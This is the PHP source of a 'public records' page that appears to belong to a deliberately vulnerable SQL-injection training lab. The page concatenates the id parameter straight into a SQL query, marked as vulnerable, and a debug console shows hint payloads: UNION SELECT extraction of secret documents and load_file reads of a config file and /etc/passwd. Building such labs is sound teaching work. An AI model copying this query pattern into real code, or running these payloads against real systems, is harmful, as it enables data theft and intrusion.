<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Public Records - The Daily Secure</title>
    <link rel="icon" href="favicon.svg" type="image/svg+xml">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="news_theme.css">
    <style>
        body { background-color: #f3f4f6; }
        .records-container { max-width: 900px; margin: 3rem auto; padding: 0 1.5rem; }
        .doc-viewer { background: white; border: 1px solid #e2e8f0; border-radius: 8px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); min-height: 500px; display: flex; flex-direction: column; }
        .doc-header { background: #f8fafc; padding: 1rem 1.5rem; border-bottom: 1px solid #e2e8f0; display: flex; justify-content: space-between; align-items: center; }
        .doc-content { padding: 2rem; flex: 1; font-family: 'Courier New', monospace; font-size: 0.9rem; color: #334155; overflow-x: auto; }
        .doc-sidebar { width: 250px; border-right: 1px solid #e2e8f0; background: white; padding: 1rem; }
    </style>
</head>
<body class="news-body">

    <!-- Navbar -->
    <nav class="news-navbar">
        <div class="news-container">
            <a href="index.php" class="news-brand">
                <span>The Daily</span> Secure
            </a>
            <div class="news-nav-links">
                <a href="lab_union.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_union.php' ? 'class="active"' : ''; ?>>Technology</a>
                <a href="lab_auto.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_auto.php' ? 'class="active"' : ''; ?>>Archive</a>
                <a href="lab_login.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_login.php' ? 'class="active"' : ''; ?>>Login</a>
                <a href="lab_error.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_error.php' ? 'class="active"' : ''; ?>>Support</a>
                <a href="lab_blind.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_blind.php' ? 'class="active"' : ''; ?>>Offers</a>
                <a href="lab_second_order.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_second_order.php' ? 'class="active"' : ''; ?>>HR Portal</a>
                <a href="lab_file.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_file.php' ? 'class="active"' : ''; ?>>Transparency</a>
                <a href="index.php" style="border-left: 1px solid #cbd5e1; padding-left: 1rem; margin-left: 0.5rem;">Lab Dashboard</a>
            </div>
        </div>
    </nav>

    <div class="records-container">
        <h1 style="font-family: var(--news-font); margin-bottom: 1.5rem; color: #111827;">Public Transparency Records</h1>
        
        <div style="display: flex; gap: 1.5rem; align-items: flex-start;">
            <!-- Document List Sidebar -->
            <div style="width: 250px; background: white; border: 1px solid #e2e8f0; border-radius: 8px; padding: 1rem;">
                <h3 style="font-size: 0.8rem; text-transform: uppercase; color: #64748b; margin-bottom: 1rem;">Available Documents</h3>
                <ul style="list-style: none; padding: 0;">
<?php $active_id = isset($_GET['id']) ? $_GET['id'] : '1'; ?>
                    <li style="margin-bottom: 0.5rem;">
                        <a href="?id=1" style="text-decoration: none; display: block; padding: 0.5rem; border-radius: 4px; <?php echo $active_id == '1' ? 'background: #eff6ff; color: #2563eb; font-weight: 600;' : 'color: #475569;'; ?>">📄 2023 Financial Report</a>
                    </li>
                    <li style="margin-bottom: 0.5rem;">
                        <a href="?id=2" style="text-decoration: none; display: block; padding: 0.5rem; border-radius: 4px; <?php echo $active_id == '2' ? 'background: #eff6ff; color: #2563eb; font-weight: 600;' : 'color: #475569;'; ?>">📄 Security Audit</a>
                    </li>
                    <li style="margin-bottom: 0.5rem;">
                        <a href="?id=3" style="text-decoration: none; display: block; padding: 0.5rem; border-radius: 4px; <?php echo $active_id == '3' ? 'background: #eff6ff; color: #2563eb; font-weight: 600;' : 'color: #475569;'; ?>">📄 Employee Handbook</a>
                    </li>
                </ul>
            </div>

            <!-- Document Viewer -->
            <div class="doc-viewer" style="flex: 1;">
                <div class="doc-header">
                    <span style="font-weight: 600; color: #475569;">Document Viewer</span>
                    <form method="GET" style="display: flex; gap: 0.5rem;">
                        <input type="text" name="id" placeholder="Doc ID" value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : '1'; ?>" style="width: 80px; padding: 0.3rem; border: 1px solid #cbd5e1; border-radius: 4px;">
                        <button type="submit" class="btn btn-primary" style="padding: 0.3rem 0.8rem; font-size: 0.8rem;">Load</button>
                    </form>
                </div>
                <div class="doc-content">
                    <?php
                    require_once 'db.php';
                    $id = isset($_GET['id']) ? $_GET['id'] : '1';
                    
                    // VULNERABLE QUERY
                    $sql = "SELECT id, title, content FROM articles WHERE id = " . $id;
                    
                    try {
                        $result = $conn->query($sql);
                        
                        if ($conn->error) {
                            echo '<div style="color: #dc2626;">Error loading document: ' . htmlspecialchars($conn->error) . '</div>';
                        } elseif ($result && $result->num_rows > 0) {
                            $documents = [];
                            while ($row = $result->fetch_assoc()) {
                                $documents[] = $row;
                            }
                            
                            // REALISTIC BEHAVIOR: Show all results (Main Doc + Injected Docs)
                            // In a real attack, these injected rows just "appear" as content.
                            foreach ($documents as $index => $doc) {
                                // Add separator between documents
                                if ($index > 0) {
                                    echo '<hr style="border: 0; border-top: 2px dashed #e2e8f0; margin: 2rem 0;">';
                                }
                                
                                echo '<h2 style="margin-top: 0; color: #1e293b; border-bottom: 1px solid #e2e8f0; padding-bottom: 1rem; margin-bottom: 1rem;">' . htmlspecialchars($doc['title'] ?? '') . '</h2>';
                                echo '<div style="line-height: 1.6;">' . nl2br(htmlspecialchars($doc['content'] ?? '')) . '</div>';
                            }
                        } else {
                            echo '<div style="color: #94a3b8; font-style: italic;">Document not found or access restricted.</div>';
                        }
                    } catch (mysqli_sql_exception $e) {
                        echo '<div style="color: #dc2626; background: #fee2e2; padding: 1rem; border-radius: 6px;">';
                        echo '<strong>SQL Error:</strong><br>';
                        echo '<code>' . htmlspecialchars($e->getMessage()) . '</code>';
                        echo '</div>';
                    }
                    ?>
                </div>
            </div>
        </div>
    </div>

    <!-- Debug Console -->
    <div class="debug-console" id="debugConsole">
        <div class="debug-header" onclick="toggleConsole()">
            <div class="debug-title">
                <span>⚠️ Developer Console</span>
                <span style="font-size: 0.8em; font-weight: normal; opacity: 0.7;">(File System Access)</span>
            </div>
            <div style="font-size: 0.8em; opacity: 0.7;">Click to Toggle</div>
        </div>
        <div class="debug-content">
            <span class="debug-label">EXECUTED QUERY:</span>
            <code class="debug-code"><?php echo htmlspecialchars($sql); ?></code>
            <div style="margin-top: 0.5rem; font-size: 0.8em; color: #64748b;">
                <strong>Hints:</strong>
                <ul style="margin: 0.5rem 0 0 1.5rem; padding: 0;">
                    <li>Extract hidden docs: 
                        <code class="debug-code" style="display:inline; padding: 0.2rem;">0 UNION SELECT 1, filename, content FROM secret_documents</code>
                    </li>
                    <li>Read internal config (Sandbox): 
                        <code class="debug-code" style="display:inline; padding: 0.2rem;">0 UNION SELECT 1, 'Config', load_file('/var/www/html/server_secret.ini')</code>
                    </li>
                    <li>Read system users (Real Linux): 
                        <code class="debug-code" style="display:inline; padding: 0.2rem;">0 UNION SELECT 1, 'Users', load_file('/etc/passwd')</code>
                    </li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function toggleConsole() {
            document.getElementById('debugConsole').classList.toggle('console-minimized');
        }
    </script>
</body>
</html>
